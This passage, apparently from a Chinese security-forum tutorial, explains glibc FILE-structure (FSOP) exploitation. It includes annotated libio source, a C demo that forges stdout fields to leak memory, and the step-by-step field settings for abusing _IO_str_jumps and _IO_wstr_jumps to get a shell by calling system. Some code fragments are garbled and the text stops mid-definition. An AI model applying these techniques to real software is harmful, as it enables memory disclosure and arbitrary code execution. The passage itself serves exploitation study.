
## `_IO_new_file_overflow` 与 `_IO_new_do_write`

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
    // _flags 不能包含 _IO_NO_WRITES，其值为 0x8 。
      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
          f->_flags |= _IO_ERR_SEEN;
          __set_errno (EBADF);
          return EOF;
    }
    //为了进入如下分枝进造成不必要的麻烦， _flags 应包含 _IO_CURRENTLY_PUTTING，其值为 0x0800
     if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
        ...
        // _IO_write_base = read_start，_IO_write_ptr = read_end 
          if (ch == EOF)
            return _IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);
        ...
    }
}

int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
    ...
    // 构造 _flags 包含 _IO_IS_APPENDING，其值为 0x1000 
    // 或者 _IO_read_end 等于 _IO_write_base 就可以直接执行到 _IO_SYSWRITE
    if (fp->_flags & _IO_IS_APPENDING)
        fp->_offset = _IO_pos_BAD;
      else if (fp->_IO_read_end != fp->_IO_write_base)
    {
          _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
          if (new_pos == _IO_pos_BAD)
            return 0;
         fp->_offset = new_pos;
    }
      count = _IO_SYSWRITE (fp, data, to_do);
    ...
}
```

即

- 设置 `_flag &~ _IO_NO_WRITES`，即 `_flag &~ 0x8`。
- 设置 `_flag & _IO_CURRENTLY_PUTTING`，即 `_flag | 0x800`。
- 设置 `_IO_write_base` 指向想要泄露的地方；`_IO_write_ptr` 指向泄露结束的地址。
- 设置 `_IO_read_end` 等于 `_IO_write_base`，或设置 `_flag & _IO_IS_APPENDING`，即 `_flag | 0x1000`。
- 设置 `_IO_write_end` 等于 `_IO_write_ptr`（非必须）。

### 示例

```c
#include

typedef unsigned long long i64;

char buf[] = "123456";

int main() {
    char stack_buf[] = "abcdef";
    i64 libc_base = (i64) &puts - 0x84420;
    // _IO_2_1_stdout
    FILE *fp = (FILE *) (libc_base + 0x1ed6a0);
    fp->_flags &= ~0x8;
    fp->_flags |= 0x800;
    fp->_IO_write_base = (char *) buf;
    fp->_IO_write_ptr = (char *) &buf[6];
    fp->_IO_read_end = fp->_IO_write_base;
    puts(stack_buf);
    return 0;
}
```

![](https://attach.52pojie.cn/forum/202310/30/170318vhh7snzrskr8oud8.png)

`image-20231022105118674.png` (2.95 KB, 下载次数: 2)

[forum.php?mod=attachment&aid=MjY1MjU4NXxhMTA5ZmY4M3wxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjU4NXxhMTA5ZmY4M3wxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

32

2023-10-30 17:03 上传

## 3. `_IO_str_jumps` 与 `_IO_wstr_jumps`

`__start___libc_IO_vtables` 指向第一个 `vtable` 地址 `_IO_helper_jumps`，而 `__stop___libc_IO_vtables` 指向最后一个 `vtable` `_IO_str_chk_jumps` 结束的地址。想将 `vtable` 覆盖成外部地址且仍然通过检查，可以有两种方式：

- 使得 `flag == &_IO_vtable_check`
- 使 `_dl_open_hook != NULL`
- 寻找其他位于 `__start___libc_IO_vtables` 和 `__stop___libc_IO_vtables` 之间的 `vtable`

第一种方式不可控，因为 `flag` 的获取和比对是类似 canary 的方式，其对应的汇编代码如下：

```asm
     mov    rax, qword ptr [rip + 0x32bb2a] 
    ror    rax, 0x11
    xor    rax, qword ptr fs:[0x30]
    cmp    rax, rdi
```

第二种方式，理论上可行，但是如果我们可以找到存在往 `_dl_open_hook` 中写值的方法，完全利用该方法来进行更为简单的利用。

第三种方式，`_IO_str_jumps` 与 `__IO_wstr_jumps` 这两个 `vtable` 就位于 `__stop___libc_IO_vtables` 和 `__start___libc_IO_vtables` 之间，所以我们是可以利用他们来通过 `IO_validate_vtable` 的检测的，只需要将 `*vtable` 填成 `_IO_str_jumps` 或 `_IO_wstr_jumps` 地址即可。`_IO_wstr_jumps` 与 `_IO_str_jumps` 功能基本一致，只是 `_IO_wstr_jumps` 是处理 `wchar` 的，利用方式主要有针对 `_IO_str_jumps` 中的 `_IO_str_finsh` 函数和 `_IO_str_overflow` 两种。

### 一些下面用到的结构体定义

```c
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

### 4. `_IO_str_jumps`

`_IO_str_jumps` 符号在 `strip` 后会丢失，定位其地址方法如下：

- `_IO_str_jumps` 是 `vtable` 中的倒数第二个表，可以通过 `vtable` 的最后地址减去 `0x168`。
- IDA 寻找 `_IO_file_jumps` 在后面找到 `_IO_str_****` 的函数表即可。

![](https://attach.52pojie.cn/forum/202310/30/170346xmfmrnuf85n8o5jr.png)

`image-20231022121407625.png` (69.11 KB, 下载次数: 3)

[forum.php?mod=attachment&aid=MjY1MjU4NnwyYTFhZGEwZXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjU4NnwyYTFhZGEwZXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

33

2023-10-30 17:03 上传

#### `_IO_str_finish`

下面是 `_IO_str_finish` 函数：

```c
/* glibc _IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;
  _IO_default_finish (fp, 0);
}
```

它使用了 `_IO_FILE` 结构体中的值当作函数地址来直接调用，如果修改 `((_IO_strfile *) fp)->_s._free_buffer` 为 `system` 地址，然后修改 `fp->_IO_buf_base` 为 `/bin/sh\x00` 字符串地址，然后触发程序执行 `_IO_str_finish` 函数就可以得到 shell。

- 首先需要绕过之前的 `_IO_flush_all_lokcp` 函数中的输出缓冲区的检查 `_mode` 以及 `_IO_write_ptr > _IO_write_base` 进入到 `_IO_OVERFLOW` 中。
- 将 `vtable` 的地址覆盖成 `_IO_str_jumps - 0x8` 的地址，这样原来 `_IO_OVERFLOW` 就变成 `_IO_str_finish`。
- `fp->_IO_buf_base = "/bin/sh\x00"` 作为函数第一个参数。
- `fp->_flags` 要不包含 `_IO_USER_BUF`，它被定义为 `1`，即 `fp->_flags` 最低位为 `0`。
- `fp->_s._free_buffer(fp + 0xe8)` 改为 `system` 或 one gadget 的地址。

#### `_IO_str_overflow`

```c
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
    int flush_only = c == EOF;
    ...
    // fp->_IO_write_ptr - fp->_IO_write_base >= (_IO_size_t) (_IO_blen (fp) + flush_only)
      pos = fp->_IO_write_ptr - fp->_IO_write_base;
      if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
        // not allowed 绕过 _IO_USER_BUF(0x01)
          if (fp->_flags & _IO_USER_BUF)
            return EOF;
          else
        {
              char *new_buf;
              char *old_buf = fp->_IO_buf_base;
            // fp->_IO_buf_end - fp->_IO_buf_base，这里让 _IO_buf_base = 0;
              size_t old_blen = _IO_blen (fp);
            // fp->_IO_buf_end = (bin_sh_addr - 100) / 2
              _IO_size_t new_size = 2 * old_blen + 100;
              if (new_size _s._allocate_buffer) (new_size);
            ...
        }
        ...
    }
    ...
}
```

即绕过条件为

- 首先需要绕过之前的 `_IO_flush_all_lokcp` 函数中的输出缓冲区的检查 `_mode` 以及 `_IO_write_ptr > _IO_write_base` 进入到 `_IO_OVERFLOW` 中。
- `_IO_buf_base = 0`，`_IO_buf_end = (bin_sh_addr - 100) / 2`
- `fp->_flags` 要不包含 `_IO_USER_BUF`，它被定义为 `1`，即 `fp->_flags` 最低位为 `0`。
- `_IO_write_ptr = ((bin_sh_addr - 100) / 2) + 1` 且 `_IO_write_base = 0x0`
- `fp->_s._allocate_buffer(fp + 0xe0)` 改为 `system` 或 `one_gadget` 地址。

直接将 `vtable->fake_IO_str_jumps_vtable` 即可，因为 `_IO_str_overflow` 也在 `0x18` 的位置。

### 4. `_IO_wstr_jumps`

其用法和 `_IO_str_jumps` 相似，`_IO_wstr_jumps` 与 `_IO_str_jumps` 功能基本一致，只是 `_IO_wstr_jumps` 是处理 `wchar` 的。其定义如下：

```c
const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
```
